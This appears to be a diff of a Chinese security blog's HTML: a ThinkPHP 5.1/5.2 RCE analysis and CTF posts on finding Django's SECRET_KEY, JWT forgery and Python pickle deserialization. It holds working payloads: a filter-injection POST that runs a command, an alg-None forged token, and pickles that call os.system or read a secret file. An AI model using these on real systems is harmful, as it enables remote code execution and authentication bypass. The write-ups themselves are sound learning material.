+            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);
+            reset($data);
+        } else {
+            $this-&gt;filterValue($data, $name, $filter);
+        }
+
+       ...
+    }</code></pre>
+<p>因为<code>$data</code>是数组(<code>$_POST</code>),调用<code>array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code></p>
+<p>对<code>$data</code>中所有值调用<code>Request::filterValue</code></p>
+<p>跟进去</p>
+<pre><code class="php">private function filterValue(&amp;$value, $key, $filters)
+    {
+        $default = array_pop($filters);
+
+        foreach ($filters as $filter) {
+            if (is_callable($filter)) {
+                // 调用函数或者方法过滤
+                $value = call_user_func($filter, $value);
+            } elseif (is_scalar($value)) {
+                if (false !== strpos($filter, &#39;/&#39;)) {
+                    // 正则过滤
+                    if (!preg_match($filter, $value)) {
+                        // 匹配不成功返回默认值
+                        $value = $default;
+                        break;
+                    }
+                } elseif (!empty($filter)) {
+                    // filter函数不存在时, 则使用filter_var进行过滤
+                    // filter为非整形值时, 调用filter_id取得过滤id
+                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
+                    if (false === $value) {
+                        $value = $default;
+                        break;
+                    }
+                }
+            }
+        }
+
+        return $value;
+    }</code></pre>
+<p>阅读代码可知,filterValue会对<code>$_POST</code>中所有值调用<code>$filter</code>中每一个可以调用的函数或方法</p>
+<p>且<code>$filter</code>=<code>$_POST</code></p>
+<p>因此有</p>
+<pre><code>http://127.0.0.1/public/
+POST:  var1=exec&amp;var2=calc.exe&amp;_method=filter</code></pre><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>对method进行了白名单限制</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/" target="_blank" rel="noopener">https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/</a> </p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 5.1.x-5.2.x全版本RCE 漏洞分析/](<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 5.1.x-5.2.x全版本RCE 漏洞分析/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="ck917a7ay000eu8v05sbg8rr3" data-title="ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
@@ -859,1393 +2521,11 @@ if(isset($_FILES[&#39;file&#39;])) {
 
 
   
-    <article id="post-django快速查找配置" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2019/12/21/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/" class="article-date">
-  <time class="dt-published" datetime="2019-12-20T17:14:33.085Z" itemprop="datePublished">2019-12-21</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/web/">web</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2019/12/21/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/">django快速查找配置</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="django快速查找配置"><a href="#django快速查找配置" class="headerlink" title="django快速查找配置"></a>django快速查找配置</h1><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>在看p牛的picklecode wp的时候卡在secret_key查找那边</p>
-<p>看到p牛一句很容易,人就傻掉了</p>
-<p><img src="https://i.loli.net/2019/12/21/8mnp5l7ODuPkBQo.png" alt="image209"></p>
-<p>花了一天时间(踩了个坑),写了个快速查找secret_key的脚本</p>
-<p>代码写的不太好,自己改改用吧////</p>
-<pre><code class="python">from django.http.response import HttpResponse, HttpResponseRedirect
-from django.template import engines
-from django.contrib.auth import login as auth_login, get_user_model, authenticate
-from django.contrib.auth.views import LoginView, logout_then_login
-from django.contrib.auth.decorators import login_required
-from django.views import generic
-from django import template
-
-import django
-from django import template
-register = template.Library()
-
-@register.filter
-def get_dict(obj,way=&quot;&quot;,depth=0):
-    if depth&gt;11:
-        return 
-    objdir=dir(obj)
-    r={&quot;dict&quot;:objdir,&quot;way&quot;:way}
-    result=&quot;&quot;
-
-    for i in objdir:            
-        try :
-            if &#39;_&#39; == i[0]:
-                continue
-            if getattr(obj, &#39;__module__&#39;, None)!=None and getattr(obj, &#39;__module__&#39;, None).split(&#39;.&#39;)[0] == django.__name__:
-                result+=get_dict(getattr(obj,i,None),way+&quot;.&quot;+i,depth+1) 
-        except TypeError:
-            pass
-
-    if &quot;SECRET_KEY&quot; in objdir or &quot;settings&quot; in objdir:
-        print(way)
-        return result+way+&quot;\n&quot;
-    return result</code></pre>
-<p>这个是把所有符合条件的都输出,你可以通过修改递归深度和返回条件来加快,不然要等个几分钟</p>
-<h2 id="顺便说下踩到的坑"><a href="#顺便说下踩到的坑" class="headerlink" title="顺便说下踩到的坑"></a>顺便说下踩到的坑</h2><p>因为不知道dir()和<code>__dict__</code>的区别,一直以为<code>__dict__</code>==dir,然后就boomm</p>
-<p>dir()和<code>__dict__</code>的区别</p>
-<p>最简单的一句发\话是<code>__dict__</code>是dir的子集合</p>
-<p> <a href="https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981" target="_blank" rel="noopener">https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981</a> </p>
-<p>所以以后查看对象的所有属性一定要用dir()</p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/12/21/django快速查找配置/">http://blog.ccreater.top/2019/12/21/django快速查找配置/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2019/12/21/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/" data-id="ck917a7bd0011u8v03qxvekqv" data-title="django快速查找配置" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-jwt攻击方式" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2019/12/19/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" class="article-date">
-  <time class="dt-published" datetime="2019-12-19T07:07:38.103Z" itemprop="datePublished">2019-12-19</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/web/">web</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2019/12/19/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/">jwt攻击方式</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p> <a href="https://xz.aliyun.com/t/6776" target="_blank" rel="noopener">https://xz.aliyun.com/t/6776</a></p>
-<p>  <a href="https://www.anquanke.com/post/id/145540" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145540</a> </p>
-<h2 id="关于jwt"><a href="#关于jwt" class="headerlink" title="关于jwt"></a>关于jwt</h2><p>JWT的全称是Json Web Token。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。</p>
-<p>jwt由三个部分组成：<code>header</code>.<code>payload</code>.<code>signature</code></p>
-<h3 id="header部分"><a href="#header部分" class="headerlink" title="header部分"></a>header部分</h3><p>header部分最常用的两个字段是<code>alg</code>和<code>typ</code>，<code>alg</code>指定了token加密使用的算法（最常用的为<em>HMAC</em>和<em>RSA</em>算法），typ`声明类型为JWT</p>
-<p>header通常会长这个样子：</p>
-<pre><code>{
-        &quot;alg&quot; : &quot;HS256&quot;,
-        &quot;typ&quot; : &quot;jwt&quot;
-}</code></pre><h3 id="payload部分"><a href="#payload部分" class="headerlink" title="payload部分"></a>payload部分</h3><p>payload则为用户数据以及一些元数据有关的声明，用以声明权限，举个例子，一次登录的过程可能会传递以下数据</p>
-<pre><code>{
-        &quot;user_role&quot; : &quot;finn&quot;,    //当前登录用户
-    &quot;iss&quot;: &quot;admin&quot;,          //该JWT的签发者
-    &quot;iat&quot;: 1573440582,        //签发时间
-    &quot;exp&quot;: 1573940267,        //过期时间
-    &quot;nbf&quot;: 1573440582,         //该时间之前不接收处理该Token
-    &quot;domain&quot;: &quot;example.com&quot;,   //面向的用户
-    &quot;jti&quot;: &quot;dff4214121e83057655e10bd9751d657&quot;   //Token唯一标识
-}</code></pre><h3 id="signature部分"><a href="#signature部分" class="headerlink" title="signature部分"></a>signature部分</h3><p>signature的功能是保护token完整性。</p>
-<p>生成方法为将header和payload两个部分联结起来，然后通过header部分指定的算法，计算出签名。</p>
-<p>抽象成公式就是</p>
-<pre><code>signature = HMAC-SHA256(base64urlEncode(header) + &#39;.&#39; + base64urlEncode(payload), secret_key)</code></pre><p>值得注意的是，编码header和payload时使用的编码方式为<code>base64urlencode</code>，<code>base64url</code>编码是<code>base64</code>的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”=”号，并将标准Base64中的”+”和”/“分别改成了”-“和”-“。</p>
-<h3 id="完整token生成"><a href="#完整token生成" class="headerlink" title="完整token生成"></a>完整token生成</h3><p>一个完整的jwt格式为(<code>header</code>.<code>payload</code>.<code>signature</code>)，其中header、payload使用base64url编码，signature通过指定算法生成。</p>
-<p>python的<code>Pyjwt</code>使用示例如下</p>
-<pre><code>import jwt
-
-encoded_jwt = jwt.encode({&#39;user_name&#39;: &#39;admin&#39;}, &#39;key&#39;, algorithm=&#39;HS256&#39;)
-print(encoded_jwt)
-print(jwt.decode(encoded_jwt, &#39;key&#39;, algorithms=[&#39;HS256&#39;]))</code></pre><p>生成的token为</p>
-<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`.`eyJ1c2VyX25hbWUiOiJhZG1pbiJ9.oL5szC7mFoJ_7FI9UVMcKfmisqr6Qlo1dusps5wOUlo</code></pre><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h3><h4 id="空加密算法"><a href="#空加密算法" class="headerlink" title="空加密算法"></a>空加密算法</h4><p>JWT支持使用空加密算法，可以在header中指定alg为<code>None</code></p>
-<p>这样的话，只要把signature设置为空（即不添加signature字段），提交到服务器，任何token都可以通过服务器的验证。举个例子，使用以下的字段</p>
-<pre><code>{
-    &quot;alg&quot; : &quot;None&quot;,
-    &quot;typ&quot; : &quot;jwt&quot;
-}
-
-{
-    &quot;user&quot; : &quot;Admin&quot;
-}</code></pre><p>生成的完整token为<code>ew0KCSJhbGciIDogIk5vbmUiLA0KCSJ0eXAiIDogImp3dCINCn0.ew0KCSJ1c2VyIiA6ICJBZG1pbiINCn0</code></p>
-<p>(header+’.’+payload，去掉了’.’+signature字段)</p>
-<p>空加密算法的设计初衷是用于调试的，但是如果某天开发人员脑阔瓦特了，在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了。攻击者只需要把alg字段设置为None，就可以在payload中构造身份信息，伪造用户身份。</p>
-<h4 id="修改RSA加密算法为HMAC"><a href="#修改RSA加密算法为HMAC" class="headerlink" title="修改RSA加密算法为HMAC"></a>修改RSA加密算法为HMAC</h4><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><p>工具 <a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a> </p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/12/19/jwt攻击方式/">http://blog.ccreater.top/2019/12/19/jwt攻击方式/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2019/12/19/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" data-id="ck917a7bn001gu8v054692hoh" data-title="jwt攻击方式" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-pickle" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2019/12/16/pickle/" class="article-date">
-  <time class="dt-published" datetime="2019-12-15T16:41:19.602Z" itemprop="datePublished">2019-12-16</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/web/">web</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2019/12/16/pickle/">python  pickle 入门</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="python-pickle"><a href="#python-pickle" class="headerlink" title="python pickle"></a>python pickle</h1><h2 id="推荐文章"><a href="#推荐文章" class="headerlink" title="推荐文章"></a>推荐文章</h2><p> <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p>
-<p>z牛: <a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188981</a> </p>
-<h2 id="pickle操作码大全-v0"><a href="#pickle操作码大全-v0" class="headerlink" title="pickle操作码大全(v0)"></a>pickle操作码大全(v0)</h2><p>有啥不懂的直接看源码把(z牛)</p>
-<pre><code class="python">
-MARK           = b&#39;(&#39;   # push special markobject on stack
-STOP           = b&#39;.&#39;   # every pickle ends with STOP
-POP            = b&#39;0&#39;   # discard topmost stack item
-POP_MARK       = b&#39;1&#39;   # discard stack top through topmost markobject
-DUP            = b&#39;2&#39;   # duplicate top stack item
-FLOAT          = b&#39;F&#39;   # push float object; decimal string argument
-INT            = b&#39;I&#39;   # push integer or bool; decimal string argument
-BININT         = b&#39;J&#39;   # push four-byte signed int
-BININT1        = b&#39;K&#39;   # push 1-byte unsigned int
-LONG           = b&#39;L&#39;   # push long; decimal string argument
-BININT2        = b&#39;M&#39;   # push 2-byte unsigned int
-NONE           = b&#39;N&#39;   # push None
-PERSID         = b&#39;P&#39;   # push persistent object; id is taken from string arg
-BINPERSID      = b&#39;Q&#39;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack
-REDUCE         = b&#39;R&#39;   # apply callable to argtuple, both on stack
-STRING         = b&#39;S&#39;   # push string; NL-terminated string argument
-BINSTRING      = b&#39;T&#39;   # push string; counted binary string argument
-SHORT_BINSTRING= b&#39;U&#39;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes
-UNICODE        = b&#39;V&#39;   # push Unicode string; raw-unicode-escaped&#39;d argument
-BINUNICODE     = b&#39;X&#39;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argument
-APPEND         = b&#39;a&#39;   # append stack top to list below it
-BUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()
-GLOBAL         = b&#39;c&#39;   # push self.find_class(modname, name); 2 string args
-DICT           = b&#39;d&#39;   # build a dict from stack items
-EMPTY_DICT     = b&#39;}&#39;   # push empty dict
-APPENDS        = b&#39;e&#39;   # extend list on stack by topmost stack slice
-GET            = b&#39;g&#39;   # push item from memo on stack; index is string arg
-BINGET         = b&#39;h&#39;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg
-INST           = b&#39;i&#39;   # build &amp; push class instance
-LONG_BINGET    = b&#39;j&#39;   # push item from memo on stack; index is 4-byte arg
-LIST           = b&#39;l&#39;   # build list from topmost stack items
-EMPTY_LIST     = b&#39;]&#39;   # push empty list
-OBJ            = b&#39;o&#39;   # build &amp; push class instance
-PUT            = b&#39;p&#39;   # store stack top in memo; index is string arg
-BINPUT         = b&#39;q&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg
-LONG_BINPUT    = b&#39;r&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg
-SETITEM        = b&#39;s&#39;   # add key+value pair to dict
-TUPLE          = b&#39;t&#39;   # build tuple from topmost stack items
-EMPTY_TUPLE    = b&#39;)&#39;   # push empty tuple
-SETITEMS       = b&#39;u&#39;   # modify dict by adding topmost key+value pairs
-BINFLOAT       = b&#39;G&#39;   # push float; arg is 8-byte float encoding
-
-TRUE           = b&#39;I01\n&#39;  # not an opcode; see INT docs in pickletools.py
-FALSE          = b&#39;I00\n&#39;  # not an opcode; see INT docs in pickletools.py
-</code></pre>
-<h2 id="pickle介绍"><a href="#pickle介绍" class="headerlink" title="pickle介绍"></a>pickle介绍</h2><h3 id="pickle的大致过程"><a href="#pickle的大致过程" class="headerlink" title="pickle的大致过程"></a>pickle的大致过程</h3><p>以Foo类为例</p>
-<ol>
-<li>提取出Foo类中的所有attribute(从<code>__dict__</code>中获得)将其转化为键值对</li>
-<li>写入对象类名</li>
-<li>写入第一步生成的键值对</li>
-</ol>
-<h3 id="unpickle的大致过程"><a href="#unpickle的大致过程" class="headerlink" title="unpickle的大致过程"></a>unpickle的大致过程</h3><ol>
-<li>获取pickle流</li>
-<li>重新构建属性列表</li>
-<li>根据保存的类名来创建对象</li>
-<li>将属性列表恢复到对象中</li>
-</ol>
-<h3 id="pvm组成-解析pickle"><a href="#pvm组成-解析pickle" class="headerlink" title="pvm组成(解析pickle)"></a>pvm组成(解析pickle)</h3><ol>
-<li>指令解释器<br>最后一步一定是返回栈顶元素</li>
-<li>栈 </li>
-<li>memo(临时保存数据)<br>用类似list的方式来读取和储存数据,以字典方式实现<br>如p100,意为把栈顶元素保存到memo中索引为100</li>
-</ol>
-<h3 id="pvm指令格式"><a href="#pvm指令格式" class="headerlink" title="pvm指令格式"></a>pvm指令格式</h3><ol>
-<li><p>pvm的操作码只有一个字节</p>
-</li>
-<li><p>需要参数的操作码,要在每一个参数后面加上换行符</p>
-</li>
-<li><p>从pickle流中读取数据,并加载到栈上</p>
-</li>
-</ol>
-<h2 id="如何生成pickle"><a href="#如何生成pickle" class="headerlink" title="如何生成pickle"></a>如何生成pickle</h2><h3 id="操作码"><a href="#操作码" class="headerlink" title="操作码"></a>操作码</h3><h4 id="加载数据"><a href="#加载数据" class="headerlink" title="加载数据"></a>加载数据</h4><table>
-<thead>
-<tr>
-<th>操作码</th>
-<th>助记</th>
-<th>加载到栈上的数据类型</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>S</td>
-<td>string</td>
-<td>String</td>
-<td>S’foo’\n</td>
-</tr>
-<tr>
-<td>V</td>
-<td>unicode</td>
-<td>unicode</td>
-<td>Vfo\u006f\n</td>
-</tr>
-<tr>
-<td>I</td>
-<td>int</td>
-<td>int</td>
-<td>I42\n</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-<h4 id="修改栈-memo"><a href="#修改栈-memo" class="headerlink" title="修改栈/memo"></a>修改栈/memo</h4><table>
-<thead>
-<tr>
-<th>操作码</th>
-<th>助记</th>
-<th>描述</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>(</td>
-<td>MARK</td>
-<td>向栈中加入一个标记</td>
-<td>(</td>
-</tr>
-<tr>
-<td>0</td>
-<td>POP</td>
-<td>弹出栈顶元素并丢弃</td>
-<td>0</td>
-</tr>
-<tr>
-<td>p<code>&lt;memo_index&gt;</code>\n</td>
-<td>PUT</td>
-<td>复制栈顶元素到memo中</td>
-<td>p101\n</td>
-</tr>
-<tr>
-<td>g<code>&lt;memo_index&gt;</code>\n</td>
-<td>GET</td>
-<td>将memo中指定元素拷贝到栈顶</td>
-<td>g101\n</td>
-</tr>
-</tbody></table>
-<h4 id="生成-修改列表-字典-元组"><a href="#生成-修改列表-字典-元组" class="headerlink" title="生成/修改列表,字典,元组"></a>生成/修改列表,字典,元组</h4><table>
-<thead>
-<tr>
-<th>操作码</th>
-<th>助记</th>
-<th>描述</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>l</td>
-<td>列表</td>
-<td>将栈顶到遇到的第一个mask之间的元素到一个列表,并将这个列表放入栈中</td>
-<td>(S’string’\nl</td>
-</tr>
-<tr>
-<td>t</td>
-<td>元组</td>
-<td>将栈顶到遇到的第一个mask之间的元素放到一个元组中,并将这个元组放入栈中</td>
-<td>(S’string’\nS’string2’\nt</td>
-</tr>
-<tr>
-<td>d</td>
-<td>字典</td>
-<td>将栈顶到遇到的第一个mask之间的元素放到一个字典中,并将这个字典放入栈中</td>
-<td>(S’key1’\nS’value1’\nS’key2’\nS’value2’\nd</td>
-</tr>
-<tr>
-<td>s</td>
-<td>SETITEM</td>
-<td>从栈出弹出三个值:字典,键,值,将键值对合并到字典中</td>
-<td>(S’key1’\nS’val1’\nS’key2’\nI123\ndS’key3’\nS’val 3’\ns</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-<h4 id="pickle-流生成元组的过程"><a href="#pickle-流生成元组的过程" class="headerlink" title="pickle 流生成元组的过程"></a>pickle 流生成元组的过程</h4><ul>
-<li><p>生成元组的指令</p>
-<pre><code>(S&#39;str1&#39;
-S&#39;str2&#39;
-I1234
-t</code></pre></li>
-<li><p>生成元组的过程图</p>
-</li>
-</ul>
-<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vcyoggx7j310z0fs74s.jpg" alt="image5192"></p>
-<h4 id="加载对象"><a href="#加载对象" class="headerlink" title="加载对象"></a>加载对象</h4><table>
-<thead>
-<tr>
-<th>操作码</th>
-<th>助记</th>
-<th>描述</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>c</td>
-<td>GLOBAL</td>
-<td>需要两个参数(module,class)来创建对象,并将其放到栈中</td>
-<td>cos\nsystem\n</td>
-</tr>
-<tr>
-<td>R</td>
-<td>REDUCE</td>
-<td>弹出一个参数元组和一个可调用对象（可能是由GLOBAL加载的），将参数应用于可调用对象并将结果压入栈中</td>
-<td>cos\nsystem\n(S’sleep 10’\ntR</td>
-</tr>
-</tbody></table>
-<h4 id="加载对象过程图"><a href="#加载对象过程图" class="headerlink" title="加载对象过程图"></a>加载对象过程图</h4><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebew5nvj312p0j8jto.jpg" alt="image5725"></p>
-<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebmas4ij31350k30v4.jpg" alt="image5808"></p>
-<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebufeq6j313g0mfq6a.jpg" alt="image5889"></p>
-<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec1wavgj312r0i3tb6.jpg" alt="image5970"></p>
-<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec9lsjpj31350iggo8.jpg" alt="image6051"></p>
-<p><img src="https://ws1.sinaimg.cn/large/006pWR9aly1g9ved0gxklj31490l7q6n.jpg" alt="image6132"></p>
-<h2 id="编写pickle的一些技巧"><a href="#编写pickle的一些技巧" class="headerlink" title="编写pickle的一些技巧"></a>编写pickle的一些技巧</h2><p>我们如何执行如下的代码:</p>
-<pre><code class="python">f=open(&#39;/path/to/massive/sikrit&#39;) 
-f.read()</code></pre>
-<p>思路是:首先执行open函数,将其储存在memo里面,在利用魔术方法来执行f.read()</p>
-<p><code>f.read()</code>可以等价替换成<code>__builtin__.apply( __builtin__.getattr(file,&#39;read&#39;), [f])</code></p>
-<p>最后合成的pickle是</p>
-<pre><code>#step1
-c__builtin__
-open
-(S&#39;/path/to/massive/sikrit&#39;
-tRp100
-#step2
-c__builtin__
-apply
-(c__builtin__
-getattr
-(c__builtin__
-file
-S&#39;read&#39;
-tR(g100
-ltR.</code></pre><h3 id="手写pickle模板"><a href="#手写pickle模板" class="headerlink" title="手写pickle模板"></a>手写pickle模板</h3><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9xumsbi3oj30qg0hoad6.jpg" alt="image6628"></p>
-<h3 id="利用-reduce-来生成pickle代码"><a href="#利用-reduce-来生成pickle代码" class="headerlink" title="利用__reduce__来生成pickle代码"></a>利用<code>__reduce__</code>来生成pickle代码</h3><p><code>__reduce__</code></p>
-<blockquote>
-<p>当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 <strong>reduce</strong> 被定义之后，当对象被Pickle时就会被调用。 </p>
-</blockquote>
-<pre><code class="python">import os, pickle
-class Test(object):
-    def __reduce__(self):
-        return (os.system,(&#39;ls&#39;,))
-
-print(pickle.dumps(Test(), protocol=0))</code></pre>
-<h3 id="利用marshal和cPickle来生成代码"><a href="#利用marshal和cPickle来生成代码" class="headerlink" title="利用marshal和cPickle来生成代码"></a>利用marshal和cPickle来生成代码</h3><pre><code class="python"># !/usr/bin/env python
-# -*- coding:utf-8 -*-
-__author__ = &#39;bit4&#39;
-__github__ = &#39;https://github.com/bit4woo&#39;
-
-import marshal
-import base64
-import cPickle
-import urllib
-import pickle
-
-def foo():#you should write your code in this function
-    import os
-    def fib(n):
-        if n &lt;= 1:
-            return n
-        return fib(n-1) + fib(n-2)
-    print &#39;fib(10) =&#39;, fib(10)
-    os.system(&#39;dir&#39;)
-
-code_serialized = base64.b64encode(marshal.dumps(foo.func_code))
-
-
-#为了保证code_serialized中的内容得到执行，我们需要如下代码
-#(types.FunctionType(marshal.loads(base64.b64decode(code_serialized)), globals(), &#39;&#39;))()
-
-payload =  &quot;&quot;&quot;ctypes
-FunctionType
-(cmarshal
-loads
-(cbase64
-b64decode
-(S&#39;%s&#39;
-tRtRc__builtin__
-globals
-(tRS&#39;&#39;
-tR(tR.&quot;&quot;&quot; % base64.b64encode(marshal.dumps(foo.func_code))
-print(payload)</code></pre>
-<h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><h3 id="通过源码查看pickle的方法"><a href="#通过源码查看pickle的方法" class="headerlink" title="通过源码查看pickle的方法"></a>通过源码查看pickle的方法</h3><p>直接所有操作码对应的变量</p>
-<p><img src="https://i.loli.net/2019/12/23/pWlFyYPKB7enMQE.png" alt="image7895"></p>
-<p><code>dispatch[BININT1[0]] = load_binint1</code></p>
-<p>找到类似这种的后面的就是对应的函数</p>
-<h2 id="pickle工具"><a href="#pickle工具" class="headerlink" title="pickle工具"></a>pickle工具</h2><p> <a href="https://github.com/sensepost/anapickle" target="_blank" rel="noopener">converttopickle.py</a></p>
-<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p> <a href="https://github.com/sensepost/anapickle/blob/master/anapickle.py" target="_blank" rel="noopener">https://github.com/sensepost/anapickle/blob/master/anapickle.py</a> </p>
